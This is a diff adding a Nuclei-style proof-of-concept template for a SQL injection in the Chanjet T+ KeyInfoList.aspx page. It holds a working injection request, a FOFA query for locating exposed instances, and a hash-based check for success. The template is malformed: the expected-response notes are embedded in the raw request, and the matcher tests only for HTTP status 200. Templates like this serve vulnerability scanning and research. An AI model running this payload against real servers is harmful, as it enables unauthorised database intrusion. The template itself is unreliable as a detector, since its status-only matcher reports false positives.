@@ -1,0 +1,34 @@
+id: poc-oay1gdkt6ozhgx4g
+info:
+  name: 畅捷通T+ KeyInfoList.aspx SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oay1gdkt6ozhgx4g'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oay1gdkt6ozhgx4g
+    fofa: app="畅捷通-TPlus"
+http:
+- raw:
+  - 'GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt='')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes(''MD5'',''123456'')))--+ HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    9ba59abbe56e057
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
